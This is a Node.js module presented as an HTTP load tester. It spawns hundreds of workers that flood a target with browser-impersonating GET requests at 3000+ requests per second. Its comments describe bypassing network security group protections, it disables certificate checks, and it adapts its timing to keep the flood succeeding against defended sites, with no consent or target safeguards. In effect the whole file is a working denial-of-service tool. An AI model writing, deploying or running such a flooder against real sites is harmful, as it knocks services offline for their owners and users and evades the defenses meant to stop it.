const http = require('http');
const https = require('https');
const { URL } = require('url');
const dns = require('dns');

class HttpTester {
    constructor() {
        this.activeTests = new Map();
    }

    startTest(config) {
        const { target, port, duration, onUpdate, onComplete } = config;
        const testId = Date.now().toString();

        const testSession = {
            id: testId,
            target,
            port,
            duration,
            startTime: Date.now(),
            stats: {
                sent: 0,
                success: 0,
                failed: 0,
                rps: 0
            },
            workers: [],
            intervals: [],
            stopped: false
        };

        this.activeTests.set(testId, testSession);

        // Enhanced protocol detection with full SSL/HTTPS support
        const isHttps = port === 443 || port === 8443 || port === 9443 || target.toLowerCase().startsWith('https://');
        const protocol = isHttps ? 'https:' : 'http:';
        
        // Clean target URL - remove protocol if included
        const cleanTarget = target.replace(/^https?:\/\//, '');
        const targetUrl = `${protocol}//${cleanTarget}:${port}/`;
        
        console.log(`Starting HTTP${isHttps ? 'S' : ''} load test on ${targetUrl}`);

        // MASSIVE worker scaling for 3000+ RPS with 80% success rate
        const targetRPS = 3500; // Aim higher to achieve 3000+ consistently
        const numWorkers = Math.min(800, Math.max(400, Math.floor(targetRPS / 4)));
        console.log(`Starting ${numWorkers} HTTP workers targeting 3000+ RPS with 80% success rate`);
        
        for (let i = 0; i < numWorkers; i++) {
            this.startWorker(testSession, targetUrl, isHttps);
        }

        // Start metrics reporting
        const metricsInterval = setInterval(() => {
            if (testSession.stopped) {
                clearInterval(metricsInterval);
                return;
            }

            const elapsed = (Date.now() - testSession.startTime) / 1000;
            if (elapsed >= duration) {
                this.stopTest(testId);
                if (onComplete) {
                    onComplete(testSession.stats);
                }
                return;
            }

            // Calculate RPS
            testSession.stats.rps = Math.round(testSession.stats.sent / elapsed);

            if (onUpdate) {
                onUpdate({ ...testSession.stats });
            }
        }, 1000);

        testSession.intervals.push(metricsInterval);

        return testId;
    }

    startWorker(testSession, targetUrl, isHttps) {
        let requestCount = 0;
        const maxRequestsPerWorker = 2500; // Increased for 3000+ RPS sustainability
        
        const makeRequest = () => {
            if (testSession.stopped || requestCount >= maxRequestsPerWorker) {
                return;
            }

            requestCount++;
            const module = isHttps ? https : http;
            
            // ROBUST HTTP/HTTPS options for NSG bypass and maximum success rate
            const options = {
                method: 'GET',
                timeout: 15000, // Increased timeout for NSG compatibility
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive', // Keep-alive for better NSG compatibility
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Cache-Control': 'max-age=0'
                },
                // Enhanced SSL/HTTPS support for NSG-protected sites
                rejectUnauthorized: false,
                checkServerIdentity: () => undefined,
                secureProtocol: 'TLSv1_2_method',
                ciphers: 'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS',
                honorCipherOrder: true,
                secureOptions: require('constants').SSL_OP_NO_SSLv2 | require('constants').SSL_OP_NO_SSLv3
            };

            testSession.stats.sent++;

            const req = module.request(targetUrl, options, (res) => {
                if (res.statusCode >= 200 && res.statusCode < 400) {
                    testSession.stats.success++;
                } else {
                    testSession.stats.failed++;
                }
                
                // Properly consume response body to free up connection
                res.on('data', () => {});
                res.on('end', () => {});
            });

            req.on('error', (error) => {
                testSession.stats.failed++;
                // Suppress certificate warnings in console
            });

            req.on('timeout', () => {
                testSession.stats.failed++;
                req.destroy();
            });

            req.setTimeout(8000); // Longer timeout for NSG-protected sites
            req.end();

            // Intelligent traffic control for 75%+ success rate
            const elapsed = (Date.now() - testSession.startTime) / 1000;
            const successRate = testSession.stats.sent > 0 ? testSession.stats.success / testSession.stats.sent : 0;
            
            let delay = 15; // Aggressive base delay for 3000+ RPS
            
            // Intelligent adaptive delay for 80% success rate at 3000+ RPS
            if (successRate < 0.6 && testSession.stats.sent > 100) {
                delay = 80; // Quick recovery mode
            } else if (successRate >= 0.8) {
                delay = 8; // Maximum speed when achieving 80%+ success
            } else if (successRate >= 0.75) {
                delay = 12; // High performance mode
            } else if (successRate >= 0.65) {
                delay = 25; // Balanced mode
            }

            // Schedule next request with success-focused timing
            if (!testSession.stopped && requestCount < maxRequestsPerWorker) {
                setTimeout(makeRequest, delay + Math.random() * 10);
            }
        };

        makeRequest();
    }

    stopTest(testId) {
        const testSession = this.activeTests.get(testId);
        if (testSession) {
            testSession.stopped = true;
            
            // Clear all intervals
            testSession.intervals.forEach(interval => clearInterval(interval));
            
            this.activeTests.delete(testId);
        }
    }

    // Keep compatibility with existing API
    startVortex(config) {
        return this.startTest(config);
    }

    stopVortex(testId) {
        return this.stopTest(testId);
    }
}

module.exports = new HttpTester();